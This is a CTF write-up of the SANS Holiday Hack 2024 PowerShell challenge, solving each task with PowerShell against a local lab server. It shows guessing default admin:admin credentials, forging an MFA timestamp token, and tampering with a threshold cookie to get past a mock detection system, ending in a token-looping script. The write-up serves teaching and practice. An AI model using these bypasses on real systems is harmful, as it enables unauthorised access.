+++
author = "Maik de Kruif"
title = "PowerShell"
subtitle = "Act 2 - SANS Holiday Hack Challenge 2024"
date = 2025-01-03T12:36:23+01:00
description = "In the PowerShell challenge, we help Piney Sappington unlock the snowball weaponry system. For silver, we solve tasks using PowerShell cmdlets like `Get-Content` and `Invoke-WebRequest`. For gold, we script a solution to generate token hashes, manage cookies, and iterate through data to bypass the standard path and secure the medal!"
cover = "img/writeups/holiday-hack-challenge/2024/act2/powershell/cover.png"
tags = [
    "Holiday Hack Challenge",
    "ctf",
    "hacking",
    "writeup",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

## Link

If you want to play the challenge yourself, you can find it here:

<https://2024.holidayhackchallenge.com/>

## Story line

Let's start off by talking to the elf:

> Hey there, friend! Piney Sappington here.
>
> You've probably heard the latest—things are getting tense around here with all the faction business between Wombley and Alabaster. But, let’s focus on this PowerShell Terminal for now.
>
> This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter intruders, but the system is in a faulty lockdown state.
>
> I certainly wasn't the one that programmed the mechanism. Nope not me. But can you help me find a way through it so I can regain access?
>
> There's two functions I need access to. The snow cannon terminal, which should be easier. And the snow cannon production and deployment plans. That one's better defended.
>
> Still, I've got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.
>
> So, think you can do it? Are you ready to show what you've got?

## Hints

There are no hints available.

## Recon

Upon opening the challenge, we’re greeted with a terminal. It looks a lot like the [Curling]({{% ref "writeups/holiday-hack-challenge/2024/act1/curling.md" %}}) challenge from before, but this time we’ll have to use some PowerShell to solve the challenge.

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/welcome.png" title="Welcome screen" >}}

Let’s enter “y”, press enter, and start the challenge.

## Silver

### Task 1

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question1.png" title="Question 1" >}}

We're starting off easy. To get the contents of a file we can use the [`Get-Content`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.4) cmdlet.

```powershell
Get-Content welcome.txt
```

### Task 2

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question2.png" title="Question 2" >}}

Now we'll have to count the words in the file. We can do this by combining the previous command with the [`Measure-Object`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/measure-object?view=powershell-7.4) cmdlet.

```powershell
Get-Content welcome.txt | Measure-Object -Word
```

### Task 3

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question3.png" title="Question 3" >}}

For the third task, we have to find a server on the local machine, we can use [`netstat`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) for that.

```powershell
netstat -a
```

### Task 4

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question4.png" title="Question 4" >}}

Now that we've found the server, we have to send a request to it. The [`Invoke-WebRequest`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4) cmdlet is made for that.

```powershell
Invoke-WebRequest "http://localhost:1225"
```

### Task 5

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question5.png" title="Question 5" >}}

Next up is sending [HTTP Basic authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) credentials. In PowerShell, we can use the [`Get-Credential`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.4) cmdlet to configure the credentials. Afterwards, we can send them along with out request.

The credentials are not given here, but we can use come common combinations like "admin" as the username and "password" as the password. After trying a few, we'll find that using "admin" for both works.

```powershell
$cred = Get-Credential  # enter admin:admin
Invoke-WebRequest "http://localhost:1225" -Credential $cred -AllowUnencryptedAuthentication
```

### Task 6

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question6.png" title="Question 6" >}}

The credentials worked, and we got a response. The response contains quite a few links, so we'll create a loop to go over them, and find the one we need.

The result from `Invoke-WebRequest` has the `Links` attribute, which contains a list of all the links on the webpage. We can loop over those, send a request for each of them, and use the `Measure-Object` cmdlet again to count the words.

```powershell
$res = Invoke-WebRequest "http://localhost:1225" -Credential $cred -AllowUnencryptedAuthentication
foreach ($link in $res.Links){
    $endpoint_res = Invoke-WebRequest $link.href -Credential $cred -AllowUnencryptedAuthentication
    $count = $endpoint_res.Content | Measure-Object -Word

    if ($count.Words -eq 138) {
        $endpoint_res.Content
    }
}
```

### Task 7

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question7.png" title="Question 7" >}}

We found the one, and it contains a reference to a CSV file. Let's use `Invoke-WebRequest` again to get the file.

```powershell
Invoke-WebRequest "http://127.0.0.1:1225/token_overview.csv" -Credential $cred -AllowUnencryptedAuthentication
```

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/shortened-content.png" title="Shortened content" >}}

After getting the file, the tasks isn't completed yet. By default, only a small part of the content is shown, and the rest is cut off. We can save the response to a variable, and use `.Content` to get the full output.

```powershell
$csv = Invoke-WebRequest "http://127.0.0.1:1225/token_overview.csv" -Credential $cred -AllowUnencryptedAuthentication
$csv.Content
```

### Task 8

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question8.png" title="Question 8" >}}

Now we just need to send a simple request again. We can find how it should look like by looking at one of the comments at the end of the CSV file. We also know which column contains the sha256sum by looking at the previous response (the header was in there).

```powershell
Invoke-WebRequest "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication
```

### Task 9

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question9.png" title="Question 9" >}}

For task 9, we'll have to send a cookie along with the request. We can do this by using the `-Headers` parameter to manually set the cookie header. For the value we can use the file's MD5 hash from the CSV.

```powershell
$res = Invoke-WebRequest "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}
$res.Content
```

### Task 10

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question10.png" title="Question 10" >}}

Next, we'll have to send another request with another cookie to a different endpoint.

```powershell
Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc; mfa_token=1735818892.786766"}
```

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/mfa-expired.png" title="MFA token expired" >}}

I took a break in between solving task 9 and 10, so by the time I sent the request the token had already expired. We can solve this issue using two different methods.

The first method is to just request a new token. We can grab the token from the response automatically using the `Links` attribute again, and sent it along.

```powershell
$token = Invoke-WebRequest "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}
$mfa_token = $token.Links[0].href
$res = Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc; mfa_token=$mfa_token"}
$res.Content
```

From taking a good look at the mfa token values though, it looks like it could be a [unix time stamp](https://www.unixtimestamp.com/); every time you request one the value increases slightly depending on time, and from experience I can see the value seems right for the current time.

Let's try just sending a timestamp very far ahead in the future.

```powershell
$res = Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc; mfa_token=2735818892.786766"}
$res.Content
```

### Task 11

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/question11.png" title="Question 11" >}}

Yay, that worked! Now for out final task, we'll have to base64 decode a string. This is not implemented in PowerShell itself, but luckily we can use some methods from the [System namespace from .NET](https://learn.microsoft.com/en-us/dotnet/api/system?view=net-9.0).

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="))
```

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/silver.png" title="End of silver" >}}

## Gold

### Continued story line

Let's first talk to the elf again, he'll tell us what we'll have to do for gold.

> Fantastic work! You've navigated PowerShell’s tricky waters and retrieved the codeword—just what we need in these uncertain times. You're proving yourself a real asset!
>
> I'll let you in on a little secret—there’s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!
>
> Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need—keep up the great work!

#### New hints

We also got some new hints from the elf.

{{< collapsible-block title="PowerShell Admin Access - Total Control" isCollapsed="true" class="tight" >}}
I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to `Get-FileHash -Algorithm SHA256`.
{{< /collapsible-block >}}

{{< collapsible-block title="PowerShell Admin Access - Fakeout EDR Threshold" isCollapsed="true" class="tight" >}}
They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!
{{< /collapsible-block >}}

### Solving

From reading the hints, it seems like we need to generate a hash for a redacted token. Luckily, one of them isn't redacted, and so we have an example of what the outcome should be. The hint also refers to SHA256, which looks right since that is also what we saw in the CSV header.

Before implementing this, it's good to first experiment on what we need. We can use CyberChef to test the hash hypothesis. If we create a [recipe](<https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)&input=NWY4ZGQyMzZmODYyZjQ1MDc4MzViMGU0MTg5MDdmZmM>) for a simple SHA256 hash of the input, we'll quickly find out that the output is not what we expect.

When playing around with the input value, we'll find that if we add a newline character to the input and run the [recipe](<https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)&input=NWY4ZGQyMzZmODYyZjQ1MDc4MzViMGU0MTg5MDdmZmMK>), it does return the expected output. This is not totally unexpected, as files often have an empty line at the end. This may have also been the case when the current hashes we generated.

In PowerShell, we can generate hashes using `Get-FileHash`. This only supports files or streams as an input though, so we'll need to create either of those for it to work. Creating a stream from a string is fairly straightforward, so let's take that route.

```powershell
$token = "5f8dd236f862f4507835b0e418907ffc`n"
$tokenAsStream = [System.IO.MemoryStream]::new()
$writer = [System.IO.StreamWriter]::new($tokenAsStream)
$writer.write($token)
$writer.Flush()
$tokenAsStream.Position = 0
(Get-FileHash -Algorithm SHA256 -InputStream $tokenAsStream).Hash
```

```txt
4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

Perfect, it works exactly as we need it to. We can now also try it with a different token, and send the request.

```powershell
$rawToken = "67c7aef0d5d3e97ad2488babd2f4c749"
$token = "$rawToken`n"
$tokenAsStream = [System.IO.MemoryStream]::new()
$writer = [System.IO.StreamWriter]::new($tokenAsStream)
$writer.write($token)
$writer.Flush()
$tokenAsStream.Position = 0
$hash = (Get-FileHash -Algorithm SHA256 -InputStream $tokenAsStream).Hash
$hash

Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/$hash" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=$rawToken; mfa_token=2735818892.786766"}
```

Great, the server accepted the request. We got a response about a cookie being set.

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/powershell/set-attempts-cookie.png" title="Setting cookie result" >}}

The cookie `attempts` is being set to `c25ha2VvaWwK01`. Let's add that to our request.

```powershell
Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/$hash" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=$rawToken; mfa_token=2735818892.786766; attempts=c25ha2VvaWwK10"}
```

<!-- prettier-ignore-start -->
```html
<h1>[-] ERROR: Access Denied</h1><br> [!] Logging access attempts
```
<!-- prettier-ignore-end -->

Now we got a different response, but a cookie is still being set. This time `attempts` is being set to `c25ha2VvaWwK02`. We can keep repeating this process, and eventually the cookie will stay at `c25ha2VvaWwK10`.

We still don't get any medal or a different message though. Perhaps the token we've chosen is not the right one, and we need a specific other one. To test this, we can create a loop that will go over all the tokens in the CSV file, making sure to skip the first line (the csv header), and the last eight line (comments).

```powershell
$cred = Get-Credential  # admin:admin
$csv = Invoke-WebRequest "http://127.0.0.1:1225/token_overview.csv" -Credential $cred -AllowUnencryptedAuthentication
foreach ($line in $($csv.Content -split "`n" | Select-Object -Skip 1 | Select-Object -SkipLast 8)){
    $rawToken = $line -split "," | Select-Object -First 1  # remove ,REDACTED from the line
    $token = "$rawToken`n"
    $tokenAsStream = [System.IO.MemoryStream]::new()
    $writer = [System.IO.StreamWriter]::new($tokenAsStream)
    $writer.write($token)
    $writer.Flush()
    $tokenAsStream.Position = 0
    $hash = (Get-FileHash -Algorithm SHA256 -InputStream $tokenAsStream).Hash

    $mfa = Invoke-WebRequest "http://127.0.0.1:1225/mfa_validate/$hash" -Credential $cred -AllowUnencryptedAuthentication -Headers @{Cookie="token=$rawToken; mfa_token=2735818892.786766; attempts=c25ha2VvaWwK10"}
    $mfa.RawContent
}
```

If we now run this and wait a second or two, we'll get the gold medal!

## Final elf message

> Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.
